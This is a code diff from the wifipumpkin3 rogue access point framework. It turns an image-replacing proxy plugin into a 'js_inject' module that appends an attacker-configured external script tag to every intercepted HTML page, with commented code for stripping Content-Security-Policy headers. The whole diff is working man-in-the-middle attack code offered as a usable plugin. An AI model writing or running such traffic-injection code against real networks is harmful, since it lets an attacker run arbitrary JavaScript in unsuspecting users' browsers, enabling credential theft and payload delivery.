@@ -1,7 +1,6 @@
-from wifipumpkin3.plugins.extension.base import BasePumpkin
+from wifipumpkin3.plugins.pumpkinproxy.base import BasePumpkin
 from os import path
 from bs4 import BeautifulSoup
-from io import StringIO
 
 # This file is part of the wifipumpkin3 Open Source Project.
 # wifipumpkin3 is licensed under the Apache 2.0.
@@ -21,34 +20,38 @@ from io import StringIO
 # limitations under the License.
 
 
-class replaceImages(BasePumpkin):
+class js_inject(BasePumpkin):
     meta = {
-        "_name": "replaceImages",
-        "_version": "1.0",
-        "_description": "this module proxy replace all images with the picture .",
-        "_author": "mh4x0f",
+        "_name": "js_inject",
+        "_version": "1.1",
+        "_description": "url injection insert and use our own JavaScript code in a page.",
+        "_author": "by Maintainer",
     }
 
     @staticmethod
     def getName():
-        return replaceImages.meta["_name"]
+        return js_inject.meta["_name"]
 
     def __init__(self):
         for key, value in self.meta.items():
             self.__dict__[key] = value
         self.ConfigParser = True
-        self.imagePath = self._config.get("set_replaceImages", "path")
+        self.url = self._config.get("set_js_inject", "url")
 
     def handleResponse(self, request, data):
-        self.content = request.responseHeaders.getRawHeaders("content-type")
-        if str(self.content).startswith("image"):
-            if path.isfile(self.imagePath):
-                try:
-                    img = StringIO(open(self.imagePath, "rb").read().decode())
-                    data = img.getvalue()
-                    print(
-                        "[{}] URL:{} image replaced...".format(self._name, request.uri)
-                    )
-                except:
-                    pass
+
+        html = BeautifulSoup(data, "lxml")
+        """
+        # To Allow CORS
+        if "Content-Security-Policy" in flow.response.headers:
+            del flow.response.headers["Content-Security-Policy"]
+        """
+        if html.body:
+            url = "{}".format(request.uri)
+            metatag = html.new_tag("script")
+            metatag.attrs["src"] = self.url
+            metatag.attrs["type"] = "text/javascript"
+            html.body.append(metatag)
+            data = str(html)
+            print("[{} js script Injected in [ {} ]".format(self._name, url))
         return data
